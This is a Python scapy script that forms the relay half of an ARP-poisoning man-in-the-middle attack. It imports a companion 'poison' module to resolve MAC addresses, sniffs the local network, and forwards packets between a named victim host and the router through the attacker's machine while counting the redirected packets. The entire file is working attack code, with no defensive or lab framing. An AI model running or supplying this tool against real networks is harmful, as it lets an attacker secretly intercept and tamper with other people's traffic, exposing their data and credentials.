from scapy.layers.inet import IP
from scapy.layers.l2 import Ether
from scapy.all import *
import sys
import poison

send_router = 0
send_victim = 0
change = True

MY_IP = "192.168.1.125"
VICTIM_IP = "192.168.1.219"
SERVER_IP = "192.168.1.1"

MY_MAC = ''
VICTIM_MAC = ''
SERVER_MAC = ''


# Receives one packet and pass it.
def handle_packet(pack):
    global change
    global send_router
    global send_victim
    if pack.haslayer(IP):
        # Forward packets from the victim to the SERVER
        if (pack[IP].src == VICTIM_IP and pack[IP].dst == SERVER_IP
                and pack[Ether].src == VICTIM_MAC and pack[Ether].dst == MY_MAC):
            change = True
            send_router += 1
            pack[Ether].dst = SERVER_MAC
            pack[Ether].src = MY_MAC
            del pack[IP].chksum  # Recalculate the checksum
            sendp(pack, verbose=False)

        # Forward packets from the SERVER to the victim
        elif (pack[IP].dst == VICTIM_IP and pack[IP].src == SERVER_IP
              and pack[Ether].src == SERVER_MAC and pack[Ether].dst == MY_MAC):
            change = True
            send_victim += 1
            pack[Ether].dst = VICTIM_MAC
            pack[Ether].src = MY_MAC
            del pack[IP].chksum  # Recalculate the checksum
            sendp(pack, verbose=False)


def update():
    global send_router
    global send_victim
    global change
    while True:
        if change:
            print(f'\rPackets redirected from me to router: {send_router}, '
                  f'Packets redirected from me to victim: {send_victim}', end='')
            change = False
        time.sleep(1)


# main method that handles packet sniffing and passing
def forward_packets():
    # Enable sniffing
    print("Sniffing and forwarding packets...")
    t = threading.Thread(target=update)
    t.start()
    sniff(prn=handle_packet, store=0)


if __name__ == "__main__":
    os.system('mode 100, 8')
    sys.argv.pop(0)
    args = sys.argv
    if len(args) != 3:
        print('Invalid number of arguments')
        exit(1)
    VICTIM_IP = args[0]
    SERVER_IP = args[1]
    MY_IP = args[2]
    while not MY_MAC or not VICTIM_MAC or not SERVER_MAC:
        MY_MAC = poison.get_mac_address(MY_IP)
        VICTIM_MAC = poison.get_mac_address(VICTIM_IP)
        SERVER_MAC = poison.get_mac_address(SERVER_IP)
    print(f'My IP: {MY_IP}\nVictim IP: {VICTIM_IP}\nSERVER IP: {SERVER_IP}'
          f'\n\nMy MAC: {MY_MAC}\nVictim MAC: {VICTIM_MAC}\nSERVER MAC: {SERVER_MAC}')
    forward_packets()
